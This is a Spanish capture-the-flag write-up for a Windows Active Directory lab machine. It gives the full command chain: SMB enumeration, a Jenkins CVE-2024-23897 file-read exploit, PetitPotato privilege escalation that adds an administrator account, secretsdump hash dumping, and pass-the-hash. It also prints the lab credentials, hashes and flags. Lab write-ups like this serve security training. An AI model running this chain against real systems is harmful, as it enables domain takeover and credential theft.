# 🚩 Chimichurri - The Hackers Labs

**Plataforma:** [The Hackers Labs](https://thehackerslabs.com)
**Sistema Operativo:** Windows
**IP de la víctima:** `192.168.200.4`

## 📌 Descripción

Este repositorio documenta el proceso de **pentesting** realizado sobre un entorno **Active Directory** en **Windows**, identificado como `chimichurri.thl`. La máquina fue comprometida mediante la explotación de vulnerabilidades en **Jenkins** (CVE-2024-23897), seguido de una escalada de privilegios utilizando **PetitPotato** y finalmente la obtención de acceso como **Administrador del dominio** mediante **Pass-The-Hash**.

---

## 🔍 Resumen de la Intrusión

| Fase | Técnica Utilizada | Resultado |
|------|-------------------|-----------|
| **Reconocimiento** | Escaneo con `nmap` | Identificación de servicios (SMB, LDAP, Kerberos, Jenkins) y entorno AD. |
| **Enumeración SMB** | `enum4linux-ng`, `netexec` | Descubrimiento de recurso compartido `drogas` y archivo `credenciales.txt`. |
| **Explotación Jenkins** | CVE-2024-23897 (Arbitrary File Read) | Lectura de credenciales del usuario `hacker` (`hacker:Perico69`). |
| **Acceso Inicial** | `evil-winrm` | Sesión como `hacker` en la máquina víctima. |
| **Escalada de Privilegios** | `PetitPotato` + `SeImpersonatePrivilege` | Creación de usuario `hackeado` y adición al grupo **Administradores**. |
| **Movimiento Lateral** | `impacket-secretsdump` | Volcado de hashes del dominio y obtención del hash NTLM del usuario **Administrador**. |
| **Dominio Total** | Pass-The-Hash (PtH) | Acceso como **Administrador** del dominio `CHIMICHURRI0`. |
| **Obtención de Flags** | Lectura de archivos | `user.txt` y `root.txt` extraídas. |

---

## 🛠️ Herramientas Utilizadas

| Herramienta | Versión | Uso |
|-------------|---------|-----|
| `nmap` | 7.98 | Escaneo de puertos y servicios. |
| `enum4linux-ng` | 1.3.7 | Enumeración de información del dominio via SMB/LDAP. |
| `netexec` | - | Listado de recursos compartidos SMB con credenciales guest. |
| `smbclient` | - | Conexión y descarga de archivos desde recursos compartidos. |
| `CVE-2024-23897 Exploit` | - | Lectura arbitraria de archivos en Jenkins. |
| `evil-winrm` | 3.9 | Acceso remoto interactivo via WinRM. |
| `PetitPotato` | - | Explotación de `SeImpersonatePrivilege` para escalada de privilegios. |
| `impacket-secretsdump` | - | Volcado de la base de datos NTDS.dit y extracción de hashes. |

---

## 📂 Archivos y Recursos Compartidos

### Recurso Compartido `drogas` (SMB)
- **Ruta:** `//chimichurri.thl/drogas`
- **Permisos:** `READ` (acceso con usuario `guest`).
- **Archivo encontrado:** `credenciales.txt`

### Contenido de `credenciales.txt`
```text
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
```

### Credenciales Obtenidas
| Usuario | Contraseña | Hash NTLM |
|---------|------------|-----------|
| `hacker` | `Perico69` | `6e7107c02923f27aae0a58e701db47e3` |
| `Administrador` | - | `058a4c99bab8b3d04a6bd959f95ce2b2` |

---

## 🚀 Pasos de Explotación

### 1. Escaneo de Puertos
```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 192.168.200.4
nmap -n -Pn -sCV -p53,88,135,139,389,445,464,593,5985,6969,47001 --min-rate 5000 192.168.200.4
```

**Resultados clave:**
- Puerto `6969`: Jenkins 2.361.4 (vulnerable a CVE-2024-23897).
- Puerto `445`: SMB (servicio de archivos y Active Directory).
- Puerto `389`: LDAP (Active Directory).

---

### 2. Configuración de `/etc/hosts`
```bash
sudo nano /etc/hosts
```
```text
192.168.200.4   chimichurri.thl
```

---

### 3. Enumeración SMB
```bash
enum4linux-ng -A chimichurri.thl
netexec smb chimichurri.thl -u guest -p '' --shares
```

**Recursos compartidos accesibles:**
| Share | Permisos | Descripción |
|-------|----------|-------------|
| `drogas` | READ | Recurso compartido inusual con archivo `credenciales.txt`. |
| `ADMIN$` | - | Recurso predeterminado de administración. |
| `C$` | - | Recurso predeterminado del sistema. |

---

### 4. Explotación de Jenkins (CVE-2024-23897)
```bash
git clone https://github.com/godylockz/CVE-2024-23897
chmod +x jenkins_fileread.py
python3 jenkins_fileread.py -u chimichurri.thl:6969
```
**Comando ejecutado:**
```text
file> C:\Users\hacker\Desktop\perico.txt
```
**Resultado:**
```text
hacker:Perico69
```

---

### 5. Acceso Inicial con Evil-WinRM
```bash
evil-winrm -i chimichurri.thl -u 'hacker' -p 'Perico69'
```

---

### 6. Escalada de Privilegios con PetitPotato
**Verificación de privilegios:**
```powershell
whoami /priv
```
**Privilegio explotado:** `SeImpersonatePrivilege`.

**Subida y ejecución de PetitPotato:**
```bash
mkdir temp
cd temp
upload PetitPotato.exe
./PetitPotato.exe -c "net user hackeado Password123 /add"
./PetitPotato.exe -c "net localgroup Administradores hackeado /add"
```

---

### 7. Volcado de Credenciales del Dominio
```bash
impacket-secretsdump chimichurri.thl/hackeado@chimichurri.thl
```
**Hash NTLM del Administrador:**
```text
Administrador:500:aad3b435b51404eeaad3b435b51404ee:058a4c99bab8b3d04a6bd959f95ce2b2:::
```

---

### 8. Pass-The-Hash para Dominio Total
```bash
evil-winrm -i chimichurri.thl -u Administrador -H '058a4c99bab8b3d04a6bd959f95ce2b2'
```

---

### 9. Obtención de Flags
```powershell
type C:\Users\hacker\Desktop\user.txt
# Flag de usuario: acrsgvs6edr8f5vaw9a8eadv6fa9b

type C:\Users\Administrador\Desktop\root.txt
# Flag de root: hjafcdv8a75e3cvsdfg6asd4f9vbsf9sa
```

---

## 🎯 Conclusión

- **Acceso inicial:** Usuario `hacker` (credenciales obtenidas via Jenkins).
- **Escalada de privilegios:** Usuario `hackeado` añadido al grupo **Administradores**.
- **Dominio total:** Acceso como **Administrador** del dominio `CHIMICHURRI0` mediante Pass-The-Hash.
- **Flags obtenidas:**
  - `user.txt`: `acrsgvs6edr8f5vaw9a8eadv6fa9b`
  - `root.txt`: `hjafcdv8a75e3cvsdfg6asd4f9vbsf9sa`

---

## 📜 Licencia

Este proyecto es para fines educativos y de **pentesting ético**. **No se recomienda su uso en sistemas sin autorización expresa.**

---
**Autor:** [The Hackers Labs](https://thehackerslabs.com)
**Fecha:** 2026-02-25
```
